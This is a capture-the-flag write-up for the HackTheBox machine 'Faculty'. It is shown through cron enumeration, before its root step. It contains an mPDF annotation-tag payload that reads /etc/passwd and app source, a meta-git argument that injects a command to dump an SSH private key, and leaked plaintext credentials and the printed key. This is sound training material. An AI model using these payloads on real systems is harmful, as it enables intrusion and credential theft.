---
Category: B2R
Difficulty: Medium
Platform: HackTheBox
Retired: true
Status: 3. Complete
Tags:
  - LFI
  - RCE
  - SQL-Injection
  - authentication-bypass
  - cap_sys_ptrace
  - control tags
  - credentials-reuse
  - gdb-privesc
  - mPDF
  - meta-git
  - process-injection-privesc
  - Linux
---
![Faculty.png](../../zzz_res/attachments/Faculty.png)

***TABLE OF CONTENTS:***

---

# Resolution summary

- Multiple **SQL Injections** permit to authenticate to the web app with a valid username
- Triggering some **verbose errors** and inspecting generated PDF’s **Exifdata** it is possible to discover a vulnerable version of mPDF
- mPDF 6.0 suffers a **Local File Inclusion** caused by injectable control tag. Exploiting the LFI it is possible to discover db credentials inside a PHP file
- **Re-using db credential** it is possible to log in as gbyolo
- gbyolo can execute **meta-git** as developer. meta-git suffers a **Remote Code Execution** vulnerability that can be used to escalate to developer
- Developer can run **gdb**, which has **cap_sys_ptrace** and so can be attached to root processes. Finding the right process it is possible to directly **call system with high privileges** and so escalate to root.

## Improved skills

- Identify vulnerabilities using OSINT (GitHub issues, public bug bounty reports)
- Exploiting cap_sys_ptrace capabilities and perform process injection

## Used tools

- nmap
- gobuster
- exiftool

## Video

---

# Information Gathering

Scanned all TCP ports:

```bash
$ sudo nmap -p- 10.129.198.96 -v -sS -oA scan/all-tcp-ports
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Enumerated open TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Faculty]
└─$ sudo nmap -sT -sV -sC 10.129.198.96 -p 80,22 -oA scan/open-tcp-ports
[sudo] password for kali:
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-03 05:24 EDT
Nmap scan report for faculty.htb (10.129.198.96)
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: School Faculty Scheduling System
|_Requested resource was login.php
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.73 seconds
```

Enumerated top 200 UDP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Faculty]
└─$ sudo nmap -sU --top-ports 200 -oA scan/open-udp-ports 10.129.198.96
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-03 05:25 EDT
Nmap scan report for faculty.htb (10.129.198.96)
Host is up (0.13s latency).
Not shown: 199 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 206.19 seconds
```

# Enumeration

## Port 80 - HTTP (nginx 1.18.0 (Ubuntu))

Browsed the web site:

![Faculty%20afc566c4b14f4de68ef8c1192ab0727a](../../zzz_res/attachments/Faculty%20afc566c4b14f4de68ef8c1192ab0727a.png)

Enumerated directories and files:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Faculty]
└─$ gobuster dir -u http://faculty.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -f -o scan/faculty_htb-dir.txt
...
/admin/               (Status: 302) [Size: 13897] [--> login.php]

$ gobuster dir -u http://faculty.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -o scan/faculty_htb-files.txt
...
/login.php            (Status: 200) [Size: 4860]
/index.php            (Status: 302) [Size: 12193] [--> login.php]
/header.php           (Status: 200) [Size: 2871]
/test.php             (Status: 500) [Size: 0]
/.                    (Status: 302) [Size: 12193] [--> login.php]

$ gobuster dir -u http://faculty.htb/admin/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -o scan/faculty_htb_admin-files.txt
...
/login.php            (Status: 200) [Size: 5618]
/index.php            (Status: 302) [Size: 13897] [--> login.php]
/ajax.php             (Status: 200) [Size: 0]
/download.php         (Status: 200) [Size: 17]
/header.php           (Status: 200) [Size: 2691]
/home.php             (Status: 200) [Size: 2995]
/.                    (Status: 302) [Size: 13897] [--> login.php]
/users.php            (Status: 200) [Size: 1593]
/readme.txt           (Status: 200) [Size: 0]
/events.php           (Status: 500) [Size: 1193]
/schedule.php         (Status: 200) [Size: 5553]
/db_connect.php       (Status: 200) [Size: 0]
/navbar.php           (Status: 200) [Size: 1116]

$ gobuster dir -u http://faculty.htb/admin/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -o scan/faculty_htb_admin-dirs.txt -q
/assets               (Status: 301) [Size: 178] [--> http://faculty.htb/admin/assets/]
/database             (Status: 301) [Size: 178] [--> http://faculty.htb/admin/database/]
```

### Post-Auth. enumeration

Users:

![Faculty%20afc566c4b14f4de68ef8c1192ab0727a](../../zzz_res/attachments/Faculty%20afc566c4b14f4de68ef8c1192ab0727a%201.png)

Pdf generator:

![Faculty%20afc566c4b14f4de68ef8c1192ab0727a](../../zzz_res/attachments/Faculty%20afc566c4b14f4de68ef8c1192ab0727a%202.png)

```
POST /admin/download.php HTTP/1.1
Host: faculty.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 2948
Origin: http://faculty.htb
Connection: close
Referer: http://faculty.htb/admin/index.php?page=subjects
Cookie: PHPSESSID=0196c6mkd6igdgsqm10i5enhse

pdf=JTI1M0NoMSUyNTNFJTI1M0NhJTJCbmFtZSUyNTNEJTI1MjJ0b3AlMjUyMiUyNTNFJTI1M0MlMjUyRmElMjUzRWZhY3VsdHkuaHRiJTI1M0MlMjUyRmgxJTI1M0UlMjUzQ2gyJTI1M0VTdWJqZWN0cyUyNTNDJTI1MkZoMiUyNTNFJTI1M0N0YWJsZSUyNTNFJTI1MDklMjUzQ3RoZWFkJTI1M0UlMjUwOSUyNTA5JTI1M0N0ciUyNTNFJTI1MDklMjUwOSUyNTA5JTI1M0N0aCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTIzJTI1M0MlMjUyRnRoJTI1M0UlMjUwOSUyNTA5JTI1MDklMjUzQ3RoJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1sZWZ0JTI1MjIlMjUzRVN1YmplY3QlMjUzQyUyNTJGdGglMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWxlZnQlMjUyMiUyNTNFRGVzY3JpcHRpb24lMjUzQyUyNTJGdGglMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDJTI1MkZ0ciUyNTNFJTI1M0MlMjUyRnRoZWFkJTI1M0UlMjUzQ3Rib2R5JTI1M0UlMjUzQ3RyJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFMSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDYiUyNTNFREJNUyUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGdGQlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UlMjUzQ3NtYWxsJTI1M0UlMjUzQ2IlMjUzRURhdGFiYXNlJTJCTWFuYWdlbWVudCUyQlN5c3RlbSUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGc21hbGwlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0MlMjUyRnRyJTI1M0UlMjUzQ3RyJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFMiUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDYiUyNTNFTWF0aGVtYXRpY3MlMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NzbWFsbCUyNTNFJTI1M0NiJTI1M0VNYXRoZW1hdGljcyUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGc21hbGwlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0MlMjUyRnRyJTI1M0UlMjUzQ3RyJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFMyUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDYiUyNTNFRW5nbGlzaCUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGdGQlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UlMjUzQ3NtYWxsJTI1M0UlMjUzQ2IlMjUzRUVuZ2xpc2glMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnNtYWxsJTI1M0UlMjUzQyUyNTJGdGQlMjUzRSUyNTNDJTI1MkZ0ciUyNTNFJTI1M0N0ciUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRTQlMjUzQyUyNTJGdGQlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UlMjUzQ2IlMjUzRUNvbXB1dGVyJTJCSGFyZHdhcmUlMjUzQyUyNTJGYiUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NzbWFsbCUyNTNFJTI1M0NiJTI1M0VDb21wdXRlciUyQkhhcmR3YXJlJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZzbWFsbCUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQyUyNTJGdHIlMjUzRSUyNTNDdHIlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0U1JTI1M0MlMjUyRnRkJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFJTI1M0NiJTI1M0VIaXN0b3J5JTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDc21hbGwlMjUzRSUyNTNDYiUyNTNFSGlzdG9yeSUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGc21hbGwlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0MlMjUyRnRyJTI1M0UlMjUzQyUyNTJGdGJvYnklMjUzRSUyNTNDJTI1MkZ0YWJsZSUyNTNF
```

![Faculty%20afc566c4b14f4de68ef8c1192ab0727a](../../zzz_res/attachments/Faculty%20afc566c4b14f4de68ef8c1192ab0727a%203.png)

Enumerated pdf ExifData:

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/Faculty/exploit]
└─$ exiftool OKDWsliQOoLpnGEjNJR0fV8Y6C.pdf
ExifTool Version Number         : 12.41
File Name                       : OKDWsliQOoLpnGEjNJR0fV8Y6C.pdf
Directory                       : .
File Size                       : 1759 bytes
File Modification Date/Time     : 2022:07:02 15:37:02-04:00
File Access Date/Time           : 2022:07:02 15:37:59-04:00
File Inode Change Date/Time     : 2022:07:02 15:37:48-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Page Layout                     : OneColumn
Producer                        : mPDF 6.0
Create Date                     : 2022:07:02 20:37:02+01:00
Modify Date                     : 2022:07:02 20:37:02+01:00
```

### mPDF documentation

>[!info]
>mPDF is a PHP library which generates PDF files from UTF-8 encoded HTML.

[mPDF](https://mpdf.github.io/)

### mPDF 6.0 vulnerabilities (rabbit hole)

[https://github.com/mpdf/mpdf/issues/949](https://github.com/mpdf/mpdf/issues/949)

[https://github.com/mpdf/mpdf/issues/1381](https://github.com/mpdf/mpdf/issues/1381)

# Exploitation

## SQL Injection Auth Bypass

**login.php**

![Faculty%20afc566c4b14f4de68ef8c1192ab0727a](../../zzz_res/attachments/Faculty%20afc566c4b14f4de68ef8c1192ab0727a%204.png)

![Faculty%20afc566c4b14f4de68ef8c1192ab0727a](../../zzz_res/attachments/Faculty%20afc566c4b14f4de68ef8c1192ab0727a%205.png)

**admin/login.php**

![Faculty%20afc566c4b14f4de68ef8c1192ab0727a](../../zzz_res/attachments/Faculty%20afc566c4b14f4de68ef8c1192ab0727a%206.png)

![Faculty%20afc566c4b14f4de68ef8c1192ab0727a](../../zzz_res/attachments/Faculty%20afc566c4b14f4de68ef8c1192ab0727a%207.png)

## Local File Inclusion using mPDF control tags
- [annotation](https://mpdf.github.io/reference/html-control-tags/annotation.html)
- [Local file inclusion at IKEA.com](https://medium.com/@jonathanbouman/local-file-inclusion-at-ikea-com-e695ed64d82f)

>[!danger]
> There is a **serious security problem in the older versions of mPDF** as we can read in [the issue being reported by h0ng10](https://github.com/mpdf/mpdf/issues/356); one is able to include files through the annotation tag.
>
> [https://github.com/mpdf/mpdf/issues/356](https://github.com/mpdf/mpdf/issues/356)

```html
<annotation file="/etc/passwd" content="/etc/passwd"  icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

Embedded the payload inside a Subject’s description:

![Faculty%20afc566c4b14f4de68ef8c1192ab0727a](../../zzz_res/attachments/Faculty%20afc566c4b14f4de68ef8c1192ab0727a%208.png)

Downloaded the resulting PDF:

![Faculty%20afc566c4b14f4de68ef8c1192ab0727a](../../zzz_res/attachments/Faculty%20afc566c4b14f4de68ef8c1192ab0727a%209.png)

![Faculty%20afc566c4b14f4de68ef8c1192ab0727a](../../zzz_res/attachments/Faculty%20afc566c4b14f4de68ef8c1192ab0727a%2010.png)

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Faculty]
└─$ cat loot/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
postfix:x:113:119::/var/spool/postfix:/usr/sbin/nologin
developer:x:1001:1002:,,,:/home/developer:/bin/bash
usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

### Leaking the full path of the application

![Faculty%20afc566c4b14f4de68ef8c1192ab0727a](../../zzz_res/attachments/Faculty%20afc566c4b14f4de68ef8c1192ab0727a%2011.png)

### Leaking application source code and configuration files

```html
<annotation file="/var/www/scheduling/admin/login.php" content="/etc/passwd"  icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

```php
<!DOCTYPE html>
<html lang="en">
<?php 
session_start();
include('./db_connect.php');
ob_start();
ob_end_flush();
?>
<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>School Faculty Scheduling System</title>
 	

<?php include('./header.php'); ?>
<?php 
if(isset($_SESSION['login_id']))
header("location:index.php?page=home");
...
```

```php
<?php 

$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
```

## Credentials reuse

```
┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Faculty]
└─$ cat loot/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
developer:x:1001:1002:,,,:/home/developer:/bin/bash

┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Faculty]
└─$ ssh developer@faculty.htb
developer@faculty.htb's password:
Permission denied, please try again.
developer@faculty.htb's password:

┌──(kali㉿kali)-[~/CTFs/HTB/B2R/Faculty]
└─$ ssh gbyolo@faculty.htb
gbyolo@faculty.htb's password:
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul  3 13:44:43 CEST 2022

  System load:           0.0
  Usage of /:            79.0% of 4.67GB
  Memory usage:          47%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.129.198.96
  IPv6 address for eth0: dead:beef::250:56ff:feb9:7c5b

0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have mail.
Last login: Sun Jul  3 01:51:43 2022 from 10.10.14.10
```

>[!important]
>gbyolo     Co.met06aci.dly53ro.per

# Lateral Movement to developer

## Local enumeration

Sudo capabilities:

```bash
gbyolo@faculty:~$ sudo -l
[sudo] password for gbyolo:
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
```

## Remote Code Execution (RCE) in meta-git

- [Remote Code Execution (RCE) in meta-git | Snyk](https://security.snyk.io/vuln/SNYK-JS-METAGIT-541513)
- [Node.js third-party modules disclosed on HackerOne: [meta-git] RCE...](https://hackerone.com/reports/728040)

Exploited the vulnerability using the PoC from HackerOne:

```bash
gbyolo@faculty:~$ ls -ald .
drwxr-x--- 6 gbyolo gbyolo 4096 Jul  3 01:55 .
gbyolo@faculty:~$ cd /dev/shm/
gbyolo@faculty:/dev/shm$ sudo -u developer meta-git clone 'sss||cat /home/developer/.ssh/id_rsa'
meta git cloning into 'sss||cat /home/developer/.ssh/id_rsa' at id_rsa

id_rsa:
fatal: repository 'sss' does not exist
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
cat: id_rsa: No such file or directory
id_rsa: command 'git clone sss||cat /home/developer/.ssh/id_rsa id_rsa' exited with error: Error: Command failed: git clone sss||cat /home/developer/.ssh/id_rsa id_rsa
(node:161384) UnhandledPromiseRejectionWarning: Error: ENOENT: no such file or directory, chdir '/dev/shm/id_rsa'
    at process.chdir (internal/process/main_thread_only.js:31:12)
    at exec (/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11)
    at execPromise.then.catch.errorMessage (/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22)
    at process._tickCallback (internal/process/next_tick.js:68:7)
    at Function.Module.runMain (internal/modules/cjs/loader.js:834:11)
    at startup (internal/bootstrap/node.js:283:19)
    at bootstrapNodeJSCore (internal/bootstrap/node.js:623:3)
(node:161384) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 2)
(node:161384) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.
```

SSH using developer key:

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/Faculty/loot]
└─$ chmod 600 developer

┌──(kali㉿kali)-[~/…/HTB/B2R/Faculty/loot]
└─$ ssh developer@faculty.htb -i developer
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul  3 13:52:10 CEST 2022

  System load:           0.01
  Usage of /:            79.0% of 4.67GB
  Memory usage:          47%
  Swap usage:            0%
  Processes:             227
  Users logged in:       0
  IPv4 address for eth0: 10.129.198.96
  IPv6 address for eth0: dead:beef::250:56ff:feb9:7c5b

0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Jul  3 03:02:11 2022 from 10.10.14.10
developer@faculty:~$ id; cat /home/developer/user.txt
uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)
9a8e4ef05376fee9a302d93c3cf172f7
```

![Faculty%20afc566c4b14f4de68ef8c1192ab0727a](../../zzz_res/attachments/Faculty%20afc566c4b14f4de68ef8c1192ab0727a%2012.png)

# Privilege Escalation

## Local enumeration

Enumerated cron job:

```
/usr/bin/crontab:
* * * * * /home/developer/sendmail.sh >/dev/null 2>&1
/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 Jun 21 23:01 .
drwxr-xr-x 110 root root 4096 Jun 27 17:34 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--   1 root root  712 Mar 27  2020 php
-rw-r--r--   1 root root  190 Jul 31  2020 popularity-contest

/etc/cron.daily:
total 48
drwxr-xr-x   2 root root 4096 Jun 21 23:02 .
drwxr-xr-x 110 root root 4096 Jun 27 17:34 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root  376 Dec  4  2019 apport
-rwxr-xr-x   1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x   1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x   1 root root 1123 Feb 25  2020 man-db
-rwxr-xr-x   1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x   1 root root  214 Apr  2  2020 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Jul 31  2020 .
drwxr-xr-x 110 root root 4096 Jun 27 17:34 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Jul 31  2020 .
